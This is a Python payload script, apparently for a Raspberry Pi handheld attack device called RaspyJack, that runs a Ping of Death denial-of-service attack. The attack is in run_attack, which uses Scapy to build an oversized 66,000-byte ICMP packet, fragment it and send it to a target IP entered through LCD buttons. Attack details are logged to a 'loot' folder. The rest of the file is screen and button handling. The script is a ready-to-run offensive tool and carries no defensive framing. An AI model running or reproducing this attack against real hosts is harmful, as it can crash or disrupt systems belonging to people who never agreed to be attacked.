#!/usr/bin/env python3
"""
RaspyJack *payload* – **DoS: Ping of Death**
==========================================
This payload performs a Ping of Death (PoD) attack. It sends an oversized
ICMP (ping) packet to a target, which can cause older, vulnerable systems
to crash or become unresponsive due to improper handling of fragmented
IP packets.

Features:
- Interactive UI for entering the target IP address.
- Uses Scapy to craft and send an oversized, fragmented ICMP packet.
- Displays current status (sending, sent, failed) on the LCD.
- Graceful exit via KEY3 or Ctrl-C.

Controls:
- MAIN SCREEN:
    - OK: Send the Ping of Death packet.
    - KEY1: Edit Target IP.
    - KEY3: Exit Payload.
- IP INPUT SCREEN:
    - UP/DOWN: Change digit at cursor position.
    - LEFT/RIGHT: Move cursor.
    - OK: Confirm IP.
    - KEY3: Cancel IP input.
"""

import sys
import os
import time
import signal
import subprocess

RASPYJACK_ROOT = '/root/Raspyjack' if os.path.isdir('/root/Raspyjack') else os.path.abspath(os.path.join(__file__, '..', '..'))
if RASPYJACK_ROOT not in sys.path:
    sys.path.insert(0, RASPYJACK_ROOT)
wifi_subdir = os.path.join(RASPYJACK_ROOT, 'wifi')
if os.path.isdir(wifi_subdir) and wifi_subdir not in sys.path:
    sys.path.insert(0, wifi_subdir)
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont
from wifi import raspyjack_integration as rji
from scapy.all import IP, ICMP, fragment, send, conf
conf.verb = 0

TARGET_IP = "192.168.1.51"

LOOT_DIR = os.path.join(RASPYJACK_ROOT, 'loot', 'dos_ping_of_death')
os.makedirs(LOOT_DIR, exist_ok=True)

PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
current_ip_input = TARGET_IP
ip_input_cursor_pos = 0
ATTACK_INTERFACE = None

def cleanup(*_):
    global running
    if running:
        running = False
        save_loot_snapshot()
        print("Ping of Death cleanup complete.", file=sys.stderr)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def save_loot_snapshot():
    """Save a loot snapshot with attack stats."""
    try:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        loot_file = os.path.join(LOOT_DIR, f"ping_of_death_{timestamp}.txt")
        with open(loot_file, 'w') as f:
            f.write(f"Ping of Death Attack\n")
            f.write(f"Target IP: {TARGET_IP}\n")
            f.write(f"Interface: {ATTACK_INTERFACE}\n")
            f.write(f"Timestamp: {timestamp}\n")
        print(f"Loot saved to {loot_file}")
    except Exception as e:
        print(f"Error saving loot: {e}", file=sys.stderr)

def draw_ui(screen_state="main", message_lines=None):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "DoS: Ping of Death", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if message_lines:
        if isinstance(message_lines, str):
            message_lines = [message_lines]
        y_offset = (HEIGHT - len(message_lines) * 12) // 2
        for line in message_lines:
            bbox = d.textbbox((0, 0), line, font=FONT)
            w = bbox[2] - bbox[0]
            x = (WIDTH - w) // 2
            d.text((x, y_offset), line, font=FONT, fill="yellow")
            y_offset += 12
    elif screen_state == "main":
        d.text((5, 30), "Target IP:", font=FONT, fill="white")
        d.text((5, 45), TARGET_IP, font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "OK=Send | KEY1=Edit IP", font=FONT, fill="cyan")
        d.text((5, 110), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Target IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 100), "UP/DOWN=Digit | LEFT/RIGHT=Move", font=FONT, fill="cyan")
        d.text((5, 110), "OK=Confirm | KEY3=Cancel", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 40), "Sending Packet...", font=FONT_TITLE, fill="red")
        d.text((5, 60), f"Target: {TARGET_IP}", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    elif screen_state == "sent":
        d.text((5, 40), "Packet sent!", font=FONT_TITLE, fill="lime")
        d.text((5, 60), "Check target.", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "failed":
        d.text((5, 40), "Attack FAILED!", font=FONT_TITLE, fill="red")
        d.text((5, 60), "Check console.", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input_logic(initial_ip):
    global current_ip_input, ip_input_cursor_pos
    current_ip_input = initial_ip
    ip_input_cursor_pos = len(initial_ip) - 1
    
    draw_ui("ip_input")
    
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.3 # seconds

    while running:
        current_time = time.time()
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                btn = name
                last_button_press_time = current_time
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "KEY3":
            return None
        
        if btn == "OK":
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return current_ip_input
            else:
                draw_ui(message_lines=["Invalid IP!", "Try again."])
                time.sleep(2)
                current_ip_input = initial_ip
                ip_input_cursor_pos = len(initial_ip) - 1
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), current_ip_input.find('.') if '.' in current_ip_input[ip_input_cursor_pos:] else len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = (int(current_char) + 1) % 10 if btn == "UP" else (int(current_char) - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.05)
    return None

def run_attack():
    global TARGET_IP, ATTACK_INTERFACE
    
    interface = rji.get_best_interface()
    if not interface:
        draw_ui(message_lines=["No active network", "interface found!"])
        time.sleep(3)
        return False
    ATTACK_INTERFACE = interface

    draw_ui("attacking")
    
    try:
        payload = 'A' * 66000 
        frags = fragment(IP(dst=TARGET_IP)/ICMP()/payload)
        
        send(frags, iface=ATTACK_INTERFACE, verbose=0)
        draw_ui("sent")
        
    except Exception as e:
        print(f"Ping of Death failed: {e}", file=sys.stderr)
        draw_ui(message_lines=["Attack FAILED!", f"{str(e)[:20]}"])
    return True

if __name__ == '__main__':
    current_screen = "main"
    last_button_press_time = 0
    BUTTON_DEBOUNCE_TIME = 0.3 # seconds

    try:
        # Check if Scapy is installed
        try:
            from scapy.all import IP
        except ImportError:
            draw_ui(message_lines=["Scapy not found!", "Install with:", "`pip install scapy`"])
            time.sleep(5)
            raise SystemExit("Scapy not found.")

        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    if run_attack():
                        time.sleep(3) # Display "sent" or "failed" for a few seconds
                    current_screen = "main"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                
                if GPIO.input(PINS["KEY1"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_ip_input = TARGET_IP
                    current_screen = "ip_input"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            
            elif current_screen == "ip_input":
                new_ip = handle_ip_input_logic(current_ip_input)
                if new_ip:
                    TARGET_IP = new_ip
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            
            time.sleep(0.05) # General loop sleep
            
    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_ui(message_lines=["An error occurred.", str(e)[:20]])
        time.sleep(3)
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Ping of Death payload finished.")